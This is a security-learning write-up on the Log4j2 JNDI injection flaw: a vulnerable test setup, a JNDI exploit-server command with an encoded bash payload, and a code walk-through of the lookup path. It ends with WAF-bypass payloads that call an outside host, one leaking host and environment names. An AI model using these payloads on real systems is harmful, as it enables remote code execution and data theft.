# Java Security Learning—Log4j2 Remote Code Execution Vulnerability

Author: H3rmesk1t

Data: 2022.02.10


# Vulnerability Description
[Apache Log4j2](https://logging.apache.org/log4j/2.x/index.html) is an open source Java-based logging tool under the Apache Software Foundation. This logging framework is widely used in business system development and is used to record log information. Due to its excellent performance, it is widely used in various common Web services. Because of some functions of Apache Log4j2, there is a recursive parsing function, the attacker uses the ${}` key identifier to trigger the JNDI injection vulnerability. This vulnerability can be triggered when the program logs the data entered by the user. Successfully exploiting this vulnerability can execute arbitrary code on the target server. Its triggering method is simple, widely used, and the vulnerability is extremely harmful.


#Environmental construction
Use `maven` to introduce the `2.14.0` version of related components that have not undergone security patch updates. Add the following configuration under `pom.xml` of the project:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>JavaSec-Learn</artifactId>
    <version>1.0-SNAPSHOT</version>

    <dependencies>
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-core</artifactId>
            <version>2.14.0</version>
        </dependency>
    </dependencies>

    <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
    </properties>

</project>
```

![](./images/1.png)

Sample code for adding vulnerability environment after the project is created:

```java
package org.h3rmesk1t.Log4j2;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/2/10 5:32 pm
 */
public class Vulnerability {

    private static final Logger logger = LogManager.getLogger();

    public static void main(String[] args) {

        logger.error("${jndi:ldap://127.0.0.1:1389/ladr0g}");
    }
}
```


# Vulnerability reappears
First start the malicious server and return malicious code to the `ldap`/`rmi` call. Here I used the `JNDI` injection tool to generate it directly.

```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,b3BlbiAtYSBDYWxjdWxhdG9y}|{base64,-d}|{bash,-i}" -A "127.0.0.1"
```

Then use the `logger.info` method to trigger the vulnerability and pop up the calculator.

![](./images/2.png)

# Vulnerability Analysis
## Vulnerability Point Confirm
First check the [official revision information] (https://issues.apache.org/jira/projects/LOG4J2/issues/LOG4J2-3201?filter=allissues). You can know that the exploitation method of the vulnerability is to implement `RCE` through LDAP injection in `JNDI`. After viewing the patch change record, you can see that it has modified the judgment of the `lookup` function.

![](./images/3.png)

![](./images/4.png)

## Key Point Analysis
As can be seen from the official documentation of `JNDI lookup`, `JndiLookup` allows variables to be retrieved through `JNDI` and then passed to the example. In `Log4j2`, the usage format of `JNDI` is: `${jndi:JNDIContent}`

![](./images/5.png)


### Logging
In practical applications, the `LogManager#getLogger` method is commonly used to obtain a `Logger` object, and call its `debug`, `info`, `error`, `warn`, `fatal`, `trace` or `log` methods to record logs and other information.

Following up on the `error` method in the sample code, I found that it will call the overloaded method of `org.apache.logging.log4j.spi.AbstractLogger#logIfEnabled` to determine whether to output `console` and log files based on the currently configured log level.

The log levels in `Log4j2` are: `ALL`<`DEBUG`<`INFO`<`WARN`<`ERROR`<`FATAL`<`OFF`.

![](./images/6.png)

By default, logs with `WARN`/`ERROR`/`FATAL` level will be output. There are two ways to change the log output level:
 1. Change log output level using configuration file

```xml
<?xml version="1.0" encoding="UTF-8"?>
<Configuration>
    <Loggers>
        <Logger name="org.h3rmesk1t" level="All"/>
    </Loggers>
</Configuration>
```

 2. Use code to configure log output level

```java
LoggerContext ctx = (LoggerContext) LogManager.getContext(false);
Configuration config = ctx.getConfiguration();
LoggerConfig loggerConfig = config.getLoggerConfig(LogManager.ROOT_LOGGER_NAME);
loggerConfig.setLevel(Level.ALL);
ctx.updateLoggers();
```

In the `logIfEnabled` method, the `logMessage` method will continue to be called, and the trigger point of this vulnerability also starts from the `logMessage` method. All methods such as `info`/`error`/`warn` that call this method can be used as the trigger point of this vulnerability, but it depends on the configured vulnerability output level.


### Message formatting
Log4j2 uses `org.apache.logging.log4j.core.pattern.MessagePatternConverter` to process log messages. When instantiating `MessagePatternConverter`, the configuration will be obtained from `Properties` and `Options` to determine whether the `Lookups` function needs to be provided.

![](./images/7.png)

Follow up on the FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS property value. Since the value of the `log4j2.formatMsgNoLookups` configuration is default to `false`, the `Lookups` function is enabled by default.

```java
public static final boolean FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS = PropertiesUtil.getProperties().getBooleanProperty("log4j2.formatMsgNoLookups", false);
```

By setting a breakpoint, step into the `org.apache.logging.log4j.core.pattern.MessagePatternConverter#format` method. Here you can see that the `Payload` we passed in will be processed. First, find the `${` flag header through a loop, and then call`
The StrSubstitutor#replace` method performs character replacement operation.

![](./images/8.png)


### Character replacement
Log4j2 uses the `org.apache.logging.log4j.core.lookup.StrSubstitutor` class to provide the character replacement operation of the `Lookup` function. The key `DEFAULT_ESCAPE` is `$`, the `DEFAULT_PREFIX` prefix is ​​`${`, the `DEFAULT_SUFFIX` suffix is ​​`}`, and the `DEFAULT_VALUE_DELIMITER_STRING` assignment delimiter is `:-`, and `ESCAPE_DELIMITER_STRING` is `:\-`.

![](./images/12.png)

The code in the previous message formatting operation: `workingBuilder.append(this.config.getStrSubstitutor().replace(event, value))` is called first, and `JNDI` happens to be `

![](./images/9.png)

![](./images/10.png)

The `StrSubstitutor#replace` method will then be called, and the `substitute` method will be called in the return statement.

![](./images/11.png)

Follow up on the `substitute` method. The `substitute` method provided by this class is the core of the entire `lookup` function, which is used to recursively replace the corresponding characters. The `substitute` method first performs a series of value settings, and then searches for the `${` prefix operation on the passed string through the `while` loop.

![](./images/13.png)

After finding the prefix, you will start looking for the suffix. However, in the `while` loop of finding the suffix, you will determine whether to replace the value in the variable. If it is replaced, the prefix will be matched again. If the prefix is ​​found, then `continue` will jump out of the loop and go through the logic of finding the suffix again to meet the nesting situation in the variable.

![](./images/14.png)

In subsequent processing, multiple `if-else` are used to match `:-` and `:\-`.
 - `:-` is an assignment keyword. If the program processes a string like `${aaaa:-bbbb}`, the result of processing will be `bbbb`, `:-` keyword will be intercepted, and the previous string will be discarded.
 - `:\-` is escaped `:-`. If a key a` of a key value pair represented by `a:b` contains `:`, then escape needs to be used to cooperate with the processing, for example `${aaa:\\-bbb:-ccc}`, which means `key` is `aaa:bbb` and `value` is `ccc`.

![](./images/15.png)

After the variable assignment is not matched or the processing is completed, the `resolveVariable` method will be called to resolve the syntax that satisfies the `lookup` function, and the corresponding `lookup` is executed. After replacing the returned result back to the original string, the `substitute` method is called again for recursive parsing. In the process of string replacement, we can see that the method provides some special writing methods and supports recursive parsing. These features can be used to bypass `WAF`. This recursive parsing logic leads to a denial of service vulnerability in addition to command execution vulnerability. At the same time, this recursive parsing logic also leads to a denial of service vulnerability.

![](./images/16.png)

Follow up on the `resolveVariable` method, and the `this.variableResolver#lookup` method will be further called for processing.

![](./images/17.png)


### Lookup Processing
The last called `this.variableResolver#lookup` method called in character replacement is actually a proxy class `Interpolator`. Log4j2` uses the `org.apache.logging.log4j.core.lookup.Interpolator` class to proxy all `StrLookup` implementation classes. That is to say, when the `Lookup` function is actually used, the `Interpolator` class is processed and distributed.

This class creates a `strLookupMap` when initializing, maps some `lookup` function keywords and processing classes, and stores them in this `Map`.

![](./images/18.png)

In the 2.14.0 version, the default is to add `log4j`, `sys`, `env`, `main`, `marker`, `java`, `lower`, `upper`, `jndi`, `jvmrunargs`, `spring`, `kubernetes`, `docker`, `web`, `date`, and `ctx`. Since some functions are not supported in the `core` package, if the corresponding processing class is not loaded, warning information will be added and skipped. The support of these different `Lookup` functions is updated with the version, for example, the two functions of `upper` and `lower` do not exist in the lower version.

![](./images/19.png)

The key logic of processing and distribution lies in the `lookup` method, which separates the `Lookup` keyword and parameters through `:` as a delimiter, matches the corresponding processing class based on the keyword as a `key` from `strLookupMap` and calls its `lookup` method.

![](./images/20.png)


### JNDI Query
When calling the `lookup` operation before, the `jndi:` keyword is used to trigger the `JNDI injection vulnerability`. In Log4j2, the processing class for the `jndi:` keyword is `org.apache.logging.log4j.core.lookup.JndiLookup`. Follow up on the `lookup` method, you can see that the `JndiManager` is used to perform the `JNDI` query function.

![](./images/21.png)

`JndiManager` uses the private inner class `JndiManagerFactory` to create an instance of `JndiManager`. A new instance of `InitialContext` is created in the return statement and passed as a parameter to create `JndiManager`, and `Context` is saved in the member variable `context`.

![](./images/22.png)

![](./images/24.png)

The `JndiManager#lookup` method calls `this.context.lookup` to implement the `JNDI` query operation. The `JndiManager` class is the final `sink` point in the `Log4j2` package in this vulnerability (it is planned to try to use `CodeQL` to detect it later).

![](./images/23.png)


# RC1 Bypass
Reference article: [Apache Log4j2 bypasses from RCE to RC1] (https://xz.aliyun.com/t/10649#toc-2). When you reach the last `lookup` operation in this version, just let the `lookup` method throw an exception when executing (provided that `lookup` is enabled), and modify the `payload` into the following form:

```java
${jndi:ldap://xxx.xxx.xxx.xxx:xxxx/ ExportObject}
```

# Waf bypass
Here is a collection of some online `Waf` bypassing `Payload`:

```text
${jndi:ldap://127.0.0.1:1389/ badClassName}

${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit}

${${::-j}ndi:rmi://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit}

${jndi:rmi://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk}

${${lower:jndi}:${lower:rmi}://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit}

${${lower:${lower:jndi}}:${lower:rmi}://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit}

${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit}

${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit}

${${upper:jndi}:${upper:rmi}://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit}

${${upper:j}${upper:n}${lower:d}i:${upper:rmi}://nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk/sploit}

${${upper:j}${upper:n}${upper:d}${upper:i}:${lower:r}m${lower:i}}://nsvi5sh112ksf1bp1ff2hvztn.l4j.zse
c.uk/sploit}

${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk}

${${upper::-j}${upper::-n}${::-d}${upper::-i}:${upper::-l}${upper::-d}${upper::-a}${upper::-p}://${hostName}.nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk}

${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.${env:COMPUTERNAME}.${env:USERDOMAIN}.${env}.nsvi5sh112ksf1bp1ff2hvztn.l4j.zsec.uk
```


# refer to
 - [A brief discussion on Log4j2 vulnerability](https://tttang.com/archive/1378/)
 - [log4j2 JNDI injection vulnerability analysis](https://www.cnpanda.net/sec/1114.html)